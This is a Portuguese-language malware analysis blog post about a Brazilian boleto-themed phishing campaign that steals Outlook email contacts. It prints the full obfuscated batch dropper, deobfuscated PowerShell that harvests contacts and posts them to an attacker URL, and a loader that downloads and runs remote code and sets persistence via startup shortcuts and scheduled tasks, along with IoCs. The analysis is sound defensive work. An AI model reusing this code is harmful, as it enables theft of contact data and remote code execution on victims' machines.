---
title: Contatos de e-mail na mira do cibercrime brasileiro - [PT-BR]
layout: post
date: '2018-04-02 23:20:00'
description: Contatos de e-mail na mira do cibercrime brasileiro
image: '/assets/images/posts/2018/04/pdf.jpeg'
tags:
- poc
- review
author: Cassius Puodzius
---
## Síntese

Um dos objetivos do cibercrime (notadamente o brasileiro) é a monetização através de fraudes. Para que o ecosistema da fraude possa funcionar, indivíduos se especializam nas diversas tarefas envolvidas.

Esse post visa analisar um malware em atividade (i.e. "in the wild") cuja finalidade é o roubo de endereços de e-mails das máquinas das vítimas. Com isso, mostra-se como a figura do *coder* e do *phisher* estão cooperando (ou se fundindo) para potencializar a realização de fraudes no Brasil.

Para seu e-mail não entrar em uma lista de phishing, não basta mais que você tome as devidas precauções, mas é necessário que todos aqueles com os quais você já se correspondeu também o faça.

## Análise

Há pouco, [vimos](http://g1.globo.com/fantastico/noticia/2018/03/hackers-que-ficaram-milionarios-com-golpes-sao-presos.html) quadrilhas que atuavam no âmbito de crimes virtuais sendo desmanteladas, no entanto isso não afetou o ânimo dos cibercriminosos.

Em especial, é interessante notar como as fraudes virtuais contam com a participação de diversos indivíduos, cada um especializado em alguma etapa do processo entre o desenvolvimento de malware até o saque e o branqueamento de dinheiro furtado.

Recentemente foi compartilhado no grupo [MalwareverseBR](https://t.me/MalwareverseBR) um link malicioso que me chamou a atenção. É importante já observar que cheguei um pouco atrasado para a análise do link compartilhado no grupo e que a URL contida na segunda fase do ataque, já não estava mais ativa. No entanto, a partir de comentários no grupo e outras informações obtidas por meio de pesquisa na Internet, creio que a análise a seguir corresponde à sequência do ataque [^1].

[^1]: Caso tenha alguma correção ou informação adicional, pode me enviar em cpuodzius@fireshellsecurity.team que farei as devidas alterações no post.

### Etapa 1

Como de habitude, o ataque inicia-se através do envio em massa de e-mails com temas genéricos, mas que podem ser atrativos aos mais leigos ou incautos - nenhuma novidade até aqui. No caso específico, sem grandes surpresas, o tema era "pagamento de boleto".

![alt text]({{ site.url }}/assets/images/posts/2018/04/email_censored.jpg "Print do e-mail enviado na campanha")

Anexado ao e-mail há PDF aparentando ser a "2a. Via de Boleto de Cobrança e Atualização de Boleto Vencido". Ao clicar em visualizar, é realizado o download do arquivo BOLDIGITAL27032018.zip, por onde inciaremos nossa análise.


![alt text]({{ site.url }}/assets/images/posts/2018/04/pdf.jpeg "PDF malicioso em anexo")

### Etapa 2

Um link encurtado (hXXps://goo.gl/ueC1q7) foi incluído no PDF para baixar o ZIP, que permitia ao operador (até a remoção do link) obter um relatório da quantidade de cliques, distribuição geográfica e plataformas das vítimas. O link, redirecionava as vítimas para um subdomínio de um DNS dinâmico (i.e.: boltercaimprimirs.ddns.net) resolvido para o IP 34.199.8.144, pertencente à Amazon AWS.

Buscando no RISKIQ, vemos que o host está ativo pelo menos desde o dia 27 de março:

![alt text]({{ site.url }}/assets/images/posts/2018/04/passive-total.png "Atividas registradas no domínio boltercaimprimirs.ddns.net")

O payload consitia em um arquivo ZIP contendo um script batch (BOLDIGITAL27032018.cmd) bastante simples:

```
@echo off
cd %SystemRoot%\System32
set a=W^in
set b=dow
set c=s^Po
set d=w^er
set e=Sh^e
set f=^ll\
set g=^v^1^.
set h=0\po
set i=we
set j=rsh
set k=^e^l^l
set l=.^e^x
set m=e^ -n
set n=op^ 
set o=-w
set p=in^ ^1 -
echo i^E^X(^"^iE^x^`(N^`E^`w`-`ob`J^`e`c^t^ ^Ne^T.wEb`cL^i^e^n^t^`)`.`d`ownL`Oa^d^S^tRiN`G^(^'h^t^tps^:^//d^l^m.sup^ot^e^.co^m/^?f^mJh^uwOE^a6^IC^uIJdSOh^rb8^W^F^t^I5D^ZQVA^84vcRVN^LT^n^jl^K6L^0bnd^Q^x^wBU^Yz^4o^ft6^I^GQ^e^Mq^Jv^/D^Wmh^C^cD1^E^Fo^g^Jrl^I^+G^bc^+/^qcTPBaw^w^c2Ap^Dpi^Q^0=`'^)^"^); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
```

Simplificando o script, vemos que ele visa simplemente executar um script Powershell hospedado externamente:

```
@echo off
cd %SystemRoot%\System32
echo iEX("iEx(NEw-obJect NeT.wEbcLient).downLOadStRiNG('https://dlm.supote.com/?fmJhuwOEa6ICuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJv/DWmhCcD1EFogJrlI+Gbc+/qcTPBawwc2ApDpiQ0=')"); | WindowsPowerShell\v1.0\powershell.exe -nop -win 1 -
```

Obs.: Justamente a URL desse script (*hXXps://dlm.supote.com/?...*) já estava desativa no momento que tentei acessá-la.

### Etapa 3

#### <a name="script-1-roubo-de-enderecos-de-e-mail"></a>Script 1: Roubo de endereços de e-mail

A partir de comentários no grupo, foi compartilhado o suposto script aravés do [pastebin](https://pastebin.com/mZWi1Dtv). Esse script procura atingir certo grau de obfuscação, mas de fato, é bastante simples de revertê-lo apenas renomeando as variáveis, demarcadas por chaves (i.e.: ${var}).

Quando renomeamos as variaveis e funções, fica clara a execução do script e intenção do ataque:

```
Add-Type -assembly 'Microsoft.Office.Interop.Outlook'
$OutlookApp = New-Object -comobject Outlook.Application
$OutlookAppMAPI = $OutlookApp.GetNameSpace('MAPI')
$GlobalList = [System.Collections.ArrayList]@()

function IsStrInAlphabeth($Str)
{
  $Alphabeth = '^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$';
  if ($Str -match $Alphabeth) {
    return $true
  }
  return $false
}

function AddAddressInGlobalList($Address) {
  if ($Address) {
    $IsAddressInGlobalList = $false
    $Address = $Address.ToLower()
    if ($Address.StartsWith("'") -And $Address.EndsWith("'")) {
      $Address = $Address.Substring(1, $Address.Length - 2)
    }
    if (IsStrInAlphabeth($Address)) {
      for($i = 0; $i -lt $GlobalList.Count; $i++) {
        if ($GlobalList[$$i] -eq $Address) {
          $IsAddressInGlobalList = $true
          break
        }
      }
      if (-Not $IsAddressInGlobalList) {
        $AddedEntry = $GlobalList.Add($Address)
      }
    }
  }
}

function GetOutlookContactList {
  $AddressLists = $OutlookAppMAPI.AddressLists
  for($i = 1; $i -le $AddressLists.Count; $i++) {
    $AddressEntry = $AddressLists.Item($i).AddressEntries
    for($j = 1; $j -le $AddressEntries.Count; $j++) {
      $AddressEntry = $AddressEntries.Item($j)
      $AddressEntryUserType = $AddressEntry.AddressEntriesUserType
      $Address = ""
      if ($AddressEntryUserType -eq 10) {
        $Address = $AddressEntry.Address
      } elseif (($AddressEntryUserType -eq 3) -Or ($AddressEntryUserType -eq 1) -Or ($AddressEntryUserType -eq 4) -Or ($AddressEntryUserType -eq 2) -Or ($AddressEntryUserType -eq 5) -Or ($AddressEntryUserType -eq 0)) {
        $Address = $AddressEntry.GetExchangeUser().PrimarySmtpAddress
      }
      AddAddressInGlobalList($Address)
    }
  }
}

function GetContactFromEmails($OutlookFolders) {
  for($i = 1; $i -le $OutlookFolders.Count; $i++) {
    $OutlookFolder = $OutlookFolders.Item($i)
    $OutlookFolderItems = $OutlookFolder.Items
    for($j = 1; $j -le $OutlookFolderItems.Count; $j++) {
      $Item = $OutlookFolderItems.Item($j)
      $Recipients = $Item.Recipients
      for($k = 1; $k -le $Recipients.Count; $k++) {
        $Recipient = $Recipients.Item($k)
        $RecipientAddress = $Recipient.AddressEntry
        $RecipientUserType = $RecipientAddress.AddressEntryUserType
        $NewAddress = "";
        if ($RecipientUserType -eq 0) {
          $NewAddress = $RecipientAddress.GetExchangeUser().PrimarySmtpAddress
        } elseif (($RecipientUserType -eq 30) -Or ($RecipientUserType -eq 10)) {
          $NewAddress = $RecipientAddress.Address
        }
        AddAddressInGlobalList($NewAddress)
      }
      $ItemSender = $OutlookFolderItem.Sender
      $RecipientUserType = $ItemSender.AddressEntryUserType
      $NewAddress = "";
      if ($RecipientUserType -eq 0) {
        $NewAddress = $ItemSender.GetExchangeUser().PrimarySmtpAddress
      } elseif (($RecipientUserType -eq 30) -Or ($RecipientUserType -eq 10)) {
        $NewAddress = $ItemSender.Address
      }
      AddAddressInGlobalList($NewAddress)
    }
    GetContactFromEmails($OutlookFolder.Folders)
  }
}

function ExfiltrateEmailAddressList() {
  GetOutlookContactlList
  GetContactFromEmails($OutlookAppMAPI.Folders)
  $FreeOutlookAppObj = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($OutlookApp)
  $WebRequest = [System.Net.WebRequest]::Create($urlPL)
  $GlobalListStr = [System.Text.Encoding]::UTF8.GetBytes("list=$($GlobalList -join ';')")
  $WebRequest.Method = 'POST'
  $WebRequest.ContentType = 'application/x-www-form-urlencoded'
  $WebRequest.ContentLength = $GlobalListStr.length
  $RequestStream = $WebRequest.GetRequestStream()
  $RequestStream.Write($GlobalListStr, 0, $GlobalListStr.length)
  $RequestStream.Close()
  [System.Net.WebResponse] $WebResponse = $WebRequest.GetResponse()
}

function Main() {
  $OutlookPath = $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\Microsoft\.Outlook')
  $ExistsOutlookFolder = [System.IO.File]::Exists($OutlookPath)
  if (-Not $ExistsOutlookFolder) {
    "" | sc $OutlookPath
    ExfiltrateEmailAddressList()
  }
}

Main
```

A intenção do ataque é roubar a lista de contatos, bem como endereços de e-mails trocados pelas vítimas, daqueles que utilizam a aplicação Outlook como ferramenta de e-mail.

Para entender melhor quais endereços são visados no ataque, podemos analisar a função GetOutlookContactList:

```
function GetOutlookContactList {
  $AddressLists = $OutlookAppMAPI.AddressLists
  for($i = 1; $i -le $AddressLists.Count; $i++) {
    $AddressEntry = $AddressLists.Item($i).AddressEntries
    for($j = 1; $j -le $AddressEntries.Count; $j++) {
      $AddressEntry = $AddressEntries.Item($j)
      $AddressEntryUserType = $AddressEntry.AddressEntriesUserType
      $Address = ""
      if ($AddressEntryUserType -eq 10) {
        $Address = $AddressEntry.Address
      } elseif (($AddressEntryUserType -eq 3) -Or ($AddressEntryUserType -eq 1) -Or ($AddressEntryUserType -eq 4) -Or ($AddressEntryUserType -eq 2) -Or ($AddressEntryUserType -eq 5) -Or ($AddressEntryUserType -eq 0)) {
        $Address = $AddressEntry.GetExchangeUser().PrimarySmtpAddress
      }
      AddAddressInGlobalList($Address)
    }
  }
}
```

Vemos que os alvos para [$AddressEntryUserType](https://msdn.microsoft.com/en-us/vba/outlook-vba/articles/addressentry-addressentryusertype-property-outlook) são: 10, 3, 1, 4, 2, 5 e 0.

Tais valores [correspondem](https://msdn.microsoft.com/en-us/vba/outlook-vba/articles/oladdressentryusertype-enumeration-outlook
) a:


| Value	|	Name									|	Description                                                    |
|-------|-------------------------------------------|------------------------------------------------------------------|
| 10    | olOutlookContactAddressEntry              | An address entry in an Outlook Contacts folder.                  |
| 3     | olExchangeAgentAddressEntry               | An address entry that is an Exchange agent.                      |
| 1     | olExchangeDistributionListAddressEntry    | An address entry that is an Exchange distribution list.          |
| 4     | olExchangeOrganizationAddressEntry        | An address entry that is an Exchange organization.               |
| 2     | olExchangePublicFolderAddressEntry        | An address entry that is an Exchange public folder.              |
| 5     | olExchangeRemoteUserAddressEntry          | An Exchange user that belongs to a different Exchange forest.    |
| 0     | olExchangeRemoteUserAddressEntry          | An Exchange user that belongs to the same Exchange forest.       |

#### Script 2: Bypass UAC & Persistência (?)

No entanto, ainda resta saber para qual endereço os e-mails obtidos são enviados, já que `$urlPL` não está definido no script:

```
$WebRequest = [System.Net.WebRequest]::Create($urlPL)
```

Outro script compartilhado no grupo (e muito semelhante [a outros](https://www.reverse.it/sample/899df4d5a05a19001aec49efdc2c5b17a9223325df8101fc1b2206112f7cb5a2?environmentId=100) mais antigos) através [pastebin](https://pastebin.com/nMxjQFdW) elucida esta questão.

```
$fileName = "$env:TEMP\$([System.DateTime]::Now.ToString('yyyyMMdd'))"
$bExists = [System.IO.File]::Exists($fileName)
 
if (-Not $bExists) {
    "" | Set-Content $fileName
 
    $bytes = (New-Object Net.WebClient).DownloadData("https://dlm.supote.com/?dWNhuwaAZasGuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJv/DWmhFcHLLkAlCKJK/mX6+9WjQfBawFQ8UJG9ig0=")
 
    for($i=0; $i -lt $bytes.count; $i++) {
        $bytes[$i] = $bytes[$i] -bxor 0x6A
    }
 
    [Reflection.Assembly]::Load($bytes)
 
    $rInt = [Loader]::randomInt(4, 16)
    $prefix = "$([Loader]::RandomString($rInt))-"
 
    [Loader]::Go3("https://dlm.supote.com","f2dgvQaFZKoKuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJv6NXK6DerhCEAmIqIR/mGlr+CoQK4XlFM8UQ==","cWJhugWEZKABuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJv6NXK6DerhCEAmIqJW1Hbfq+D9F/kflgE1UA==","dGZnuA2Da6YKuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJv6NXK6DerhCEAmIqJW1UvY69WjQfBakVo0AJe12gk=","dmhjvAyBZ6YG9ptBe8pKTMCSgpReVTFZxJLrYnw9MXfsCILXa3FjyhosNA8yROSsOSOqjrjbPFOwN9DFNHgABIFrwG3Ry6yEH/0b3QAwVZa6iwkp",$prefix)
 
    $var1 = [Loader]::RandomString($rInt)
    $var2 = [Loader]::RandomString($rInt)
    $var3 = [Loader]::RandomString($rInt)
 
    $cmdFileName = "$([Loader]::outDir)\$([Loader]::RandomString([Loader]::randomInt(6, 16))).cmd"
 
    $cmdSource  =  "@Echo off`r`n"
    $cmdSource  += "Setlocal EnableExtensions`r`n"
    $cmdSource  += "Setlocal EnableDelayedExpansion`r`n"
    $cmdSource  += "Set $var1=HKCU`r`n"
    $cmdSource  += "Set $var1=%$var1%\Software`r`n"
    $cmdSource  += "Set $var1=%$var1%\Microsoft`r`n"
    $cmdSource  += "Set $var2=`r`n"
    $cmdSource  += "FOR /F `"usebackq tokens=1,2*`" %%1 IN (``REG QUERY %$var1%``) DO (`r`n"
    $cmdSource  += "Set $var3=%%11`r`n"
    $cmdSource  += "IF `"!$var3`:~0,$($prefix.Length)!`"==`"$prefix`" (`r`n"
    $cmdSource  += "Set $var2=!$var2!%%3`r`n"
    $cmdSource  += ")`r`n"
    $cmdSource  += ")`r`n"
    $cmdSource  += "%$var2%`r`n"
    $cmdSource | Set-Content $cmdFileName
 
    $lnkFileName = "$([Loader]::outDir)\$env:USERNAME.lnk"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($lnkFilename)
    $Shortcut.TargetPath = $cmdFileName
    $Shortcut.WindowStyle = 7
    $Shortcut.Save()
 
    $TaskStartTime = [datetime]::Now.AddSeconds(5)
    $TaskEndTime = [datetime]::Now.AddSeconds(35)
 
    $taskName = [Loader]::RandomString($rInt)
 
    $service = New-Object -ComObject("Schedule.Service")
    $service.Connect()
 
    $rootFolder = $service.GetFolder("\")
 
    $TaskDefinition = $service.NewTask(0)
    $TaskDefinition.RegistrationInfo.Description = ""
    $TaskDefinition.Settings.Enabled = $true
    $TaskDefinition.Settings.DisallowStartIfOnBatteries = $false
    $TaskDefinition.Settings.DeleteExpiredTaskAfter = "PT0M"
 
    $triggers = $TaskDefinition.Triggers
    $trigger = $triggers.Create(1)
    $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.EndBoundary = $TaskEndTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
    $trigger.Enabled = $true
 
    $action = $TaskDefinition.Actions.Create(0)
    $action.Path = $cmdFileName
    $action.Arguments = ""
 
    $action = $TaskDefinition.Actions.Create(0)
    $action.Path = "schtasks.exe"
    $action.Arguments = "/Delete /TN $taskName /F"
 
    $rootFolder.RegisterTaskDefinition($taskName, $TaskDefinition, 6, "", $null, 0)
 
    $urlPL = "https://dlm.supote.com/?dmNnvgWAYKAB95tBe8pKTMCSgpReVTFZxJLrYnw9MXfsCILXa3FjyhosNA8yROSsOSOqjrjbIVOwT9TuamdZH69NzWvW2++EHJxP7gpNXcDdhQRgMl0C8FIoGq8="
    IEX(New-Object Net.WebClient).DownloadString("https://dlm.supote.com/?fmJhsAWLZqcFuIJdSOhrb8WFtI5DZQVA84vcRVNLTnjlK6L0bndQxwBUYz4oft6IGQeMqJvnNXLCEPnUC3g8MqFS/mLE+9OkOKRA8F45SJ+4gA4tNgYE")
}
```

Apesar de, novamente, não ter acesso ao script em atividade, o que limita parcialmente a análise, vemos que o script escreve ("*dropa*") um script batch em um arquivo de nome aleatório:

```
$cmdFileName = "$([Loader]::outDir)\$([Loader]::RandomString([Loader]::randomInt(6, 16))).cmd"
```

Script batch:

```
@Echo off
Setlocal EnableExtensions
Setlocal EnableDelayedExpansion
Set $var1=HKCU
Set $var1=%$var1%\Software
Set $var1=%$var1%\Microsoft
Set $var2=
FOR /F "usebackq tokens=1,2*" %%1 IN (`REG QUERY %$var1%`) DO (
    Set $var3=%%11
    IF "!$var3:~0,$($prefix.Length)!"=="$prefix" (
        Set $var2=!$var2!%%3
    )
)
%$var2%
```

O script percorre as chaves de registro em HKCU\Software\Microsoft e executa todos os comandos (valores em $var2) cujos nomes das chaves iniciam com um prefixo igual ao $prefix, onde `$prefix` está definido por:

```
$rInt = [Loader]::randomInt(4, 16)
$prefix = "$([Loader]::RandomString($rInt))-"
```

Um link apontando para esse script é criado em:

```
$lnkFileName = "$([Loader]::outDir)\$env:USERNAME.lnk"
```

`$([Loader]::outDir)` não está definido nesse snippet, mas é usual (e lógico nesse caso) ser um diretório de startup, que fará com que o script, apontado pelo *.LNK*, seja executado sempre que o sistema é inicializado.

Para bypassar o UAC, o script executado através de uma tarefa criada para ser inicializada em 5s. A tarefa possui duas ações:

##### Ação 1: Execução do scritp
```
$action = $TaskDefinition.Actions.Create(0)
$action.Path = $cmdFileName
$action.Arguments = ""
```

##### Ação 2: Remoção da tarefa recém criada
```
$action = $TaskDefinition.Actions.Create(0)
$action.Path = "schtasks.exe"
$action.Arguments = "/Delete /TN $taskName /F"
```

A tarefa é removida para dimunir os IoCs associados à cadeia de ataque.

Finalmente, a variável `$urlPL` é definida e um outro script remoto, que muito provavelmente corresponde àquele analisado anteriormente (i.e. [script 1](#script-1-roubo-de-enderecos-de-e-mail)), é executado.

Q.E.D.

## IoCs

### URLs

hXXps://goo.gl/ueC1q7
hXXp://boltercaimprimirs.ddns.net/

### Domínios

dlm.supote.com
boltercaimprimirs.ddns.net

### Hashs

| SHA1                                     | Arquivo                |
|------------------------------------------|------------------------|
| 09e7021d3fb4fd610c11bd35fb86160e5df3d622 | BOLDIGITAL27032018.zip |

### E-mails

| Remetente						| Assunto			                          | Anexo            |
|-------------------------------|---------------------------------------------|------------------|
| ultimoxavisos121@uol.com.br   | 2via: Boleto pendente em Anexo No:98111469  | BOL-9665109.PDF  |
